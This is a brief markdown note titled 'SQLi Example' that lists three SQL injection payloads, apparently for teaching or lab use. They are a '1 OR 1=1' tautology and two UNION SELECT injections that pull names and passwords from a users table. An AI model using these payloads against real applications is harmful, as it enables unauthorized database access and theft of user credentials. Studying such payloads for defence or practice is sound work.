# SQLi Example

```
1 OR 1=1
```

```
1 OR 1=1 UNION SELECT id, fname, password, age FROM users
```

```
1 UNION SELECT id, fname||' '||lname, password, age FROM users
```
